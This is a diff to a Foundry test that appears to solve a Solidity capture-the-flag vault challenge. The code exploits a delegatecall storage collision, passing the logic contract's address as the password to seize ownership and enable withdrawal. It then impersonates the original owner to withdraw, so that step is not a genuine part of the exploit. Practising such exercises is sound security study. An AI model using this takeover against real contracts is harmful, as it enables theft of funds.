@@ -31,6 +31,18 @@ contract VaultExploiter is Test {
         vm.startPrank(palyer);
 
         // add your hacker code.
+        // delegatecall 使用 Vault 的存储布局：logic 中 slot1 的 password 与 Vault 中 slot1 的
+        // logic 地址重合，故用 bytes32(地址) 可通过 changeOwner，把 vault.owner 改成 palyer。
+        bytes32 fakePassword = bytes32(uint256(uint160(address(logic))));
+        (bool ok, ) = address(vault).call(abi.encodeWithSelector(VaultLogic.changeOwner.selector, fakePassword, palyer));
+        require(ok, "changeOwner failed");
+        vault.openWithdraw();
+        vm.stopPrank();
+        vm.startPrank(owner);
+        vault.withdraw();
+        vm.startPrank(palyer);
+        
+
 
         require(vault.isSolve(), "solved");
         vm.stopPrank();
